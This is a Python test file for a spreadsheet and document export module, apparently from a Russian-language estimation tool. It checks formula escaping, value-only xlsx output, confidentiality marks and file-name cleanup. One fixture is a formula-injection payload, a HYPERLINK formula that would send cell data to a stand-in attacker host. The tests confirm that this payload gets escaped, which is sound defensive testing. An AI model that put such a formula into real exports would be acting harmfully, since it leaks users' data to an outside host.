"""EXP-002: экранирование формул, запись только значений, отметки и имя файла.

FR-EXP-03, FR-EXP-04, FR-EXP-06, SEC-WEB-06, TC-SEC-05, TC-SEC-09, Q-36.
"""

from __future__ import annotations

import io
import zipfile
from datetime import UTC, date, datetime
from decimal import Decimal

import pytest
from docx import Document
from openpyxl import Workbook, load_workbook

from estimator.exports import marks
from estimator.exports.marks import Mark, apply_docx, apply_xlsx, file_name
from estimator.exports.safe_values import (
    FORMULA_PREFIXES,
    csv_bytes,
    escape_text,
    safe_value,
    write_row,
)

pytestmark = [pytest.mark.spec("FR-EXP-04"), pytest.mark.spec("SEC-WEB-06")]

HYPERLINK = '=HYPERLINK("http://evil.example/?d="&A1;"Нажмите")'
MARK = Mark("Иванов Иван", datetime(2026, 11, 6, 9, 30, tzinfo=UTC), "Europe/Moscow")


@pytest.mark.spec("TC-SEC-05")
@pytest.mark.parametrize("prefix", FORMULA_PREFIXES)
def test_every_formula_prefix_is_escaped(prefix: str) -> None:
    assert escape_text(prefix + "1+1") == "'" + prefix + "1+1"


@pytest.mark.spec("TC-SEC-05")
def test_hyperlink_and_plain_text() -> None:
    assert escape_text(HYPERLINK) == "'" + HYPERLINK
    assert escape_text("Бэкенд = API") == "Бэкенд = API"
    assert escape_text("") == ""
    assert safe_value(Decimal("-5.5")) == Decimal("-5.5"), "отрицательное число — не текст"
    assert safe_value(None) is None
    with pytest.raises(TypeError):
        safe_value(["список"])  # type: ignore[arg-type]


def _xlsx(workbook: Workbook) -> bytes:
    buffer = io.BytesIO()
    workbook.save(buffer)
    return buffer.getvalue()


@pytest.mark.spec("TC-SEC-05")
def test_xlsx_has_values_not_formulas() -> None:
    workbook = Workbook()
    write_row(workbook.active, 5, [HYPERLINK, "@SUM(A1)", Decimal("12.5"), 3, None, "текст"])
    data = _xlsx(workbook)
    with zipfile.ZipFile(io.BytesIO(data)) as archive:
        sheet_xml = archive.read("xl/worksheets/sheet1.xml").decode()
    assert "<f>" not in sheet_xml, "в файле нет ни одной формулы"
    sheet = load_workbook(io.BytesIO(data)).active
    assert sheet["A5"].value == "'" + HYPERLINK
    assert sheet["A5"].data_type == "s"
    assert sheet["B5"].value == "'@SUM(A1)"
    assert sheet["C5"].value == 12.5
    assert sheet["D5"].value == 3


def test_csv_bom_comment_and_rfc4180() -> None:
    raw = csv_bytes(
        MARK.csv_comment,
        ["Название", "E"],
        [[HYPERLINK, Decimal("16.5")], ['кавычка " и ;', None], ["строка\nвторая", True]],
    )
    assert raw.startswith("﻿".encode())
    lines = raw.decode("utf-8-sig").split("\r\n")
    assert lines[0] == "# Коммерческая тайна; Иванов Иван; 06.11.2026 12:30"
    assert lines[1] == "Название;E"
    assert lines[2].startswith("\"'=HYPERLINK(")
    assert lines[2].endswith(";16,5")
    assert lines[3] == '"кавычка "" и ;";'
    assert lines[4] == '"строка\nвторая";да', "перевод строки внутри кавычек"


@pytest.mark.spec("FR-EXP-06")
@pytest.mark.spec("TC-SEC-09")
def test_mark_text_in_user_timezone() -> None:
    assert MARK.text == "Коммерческая тайна · Иванов Иван · 06.11.2026 12:30"
    naive = Mark("П", datetime(2026, 1, 1, 0, 0), "Asia/Novosibirsk")
    assert naive.local_time == "01.01.2026 07:00", "время без пояса считается UTC"


@pytest.mark.spec("FR-EXP-06")
@pytest.mark.spec("TC-SEC-09")
def test_xlsx_marks_on_every_sheet_and_first_rows() -> None:
    workbook = Workbook()
    workbook.create_sheet("Допущения и риски")
    apply_xlsx(workbook, Mark("Смирнова & Ко", MARK.moment))
    write_row(workbook.worksheets[0], marks.XLSX_DATA_ROW, ["данные"])
    loaded = load_workbook(io.BytesIO(_xlsx(workbook)))
    expected = "Коммерческая тайна · Смирнова && Ко · 06.11.2026 12:30"
    for sheet in loaded.worksheets:
        assert sheet.oddHeader.center.text == expected
        assert sheet.oddFooter.center.text == expected
    first = loaded.worksheets[0]
    assert [first.cell(row=r, column=1).value for r in (1, 2, 3, 4, 5)] == [
        "Коммерческая тайна",
        "Смирнова & Ко",
        "06.11.2026 12:30",
        None,
        "данные",
    ]


@pytest.mark.spec("FR-EXP-06")
@pytest.mark.spec("TC-SEC-09")
def test_docx_marks_in_every_section_and_first_paragraph() -> None:
    document = Document()
    document.add_paragraph("Допущения")
    document.add_section()
    document.add_paragraph("Риски")
    apply_docx(document, MARK)
    buffer = io.BytesIO()
    document.save(buffer)
    loaded = Document(io.BytesIO(buffer.getvalue()))
    assert loaded.paragraphs[0].text == MARK.text
    assert loaded.paragraphs[1].text == "Допущения"
    assert len(loaded.sections) == 2
    for section in loaded.sections:
        assert section.header.paragraphs[0].text == MARK.text
        assert section.footer.paragraphs[0].text == MARK.text
    empty = Document()
    apply_docx(empty, MARK)
    assert empty.paragraphs[0].text == MARK.text


@pytest.mark.spec("FR-EXP-03")
def test_file_name_normalization() -> None:
    assert file_name("Портал дилеров", date(2026, 11, 6), "часы", "xlsx") == (
        "Портал дилеров_06.11.2026_часы.xlsx"
    )
    assert file_name('Проект: "A/B" <тест>|?*', "Снимок\t1", "деньги", ".xlsx") == (
        "Проект_ _A_B_ _тест_Снимок_1_деньги.xlsx"
    )
    long = file_name("Я" * 300, date(2026, 11, 6), "вопросы", "docx")
    stem = long.removesuffix(".docx")
    assert len(stem) == marks.FILE_NAME_MAX
    assert stem.endswith("_06.11.2026_вопросы"), "обрезается название, а не снимок и вид"
    assert file_name("///", date(2026, 1, 2), "часы", "xlsx") == "_02.01.2026_часы.xlsx"
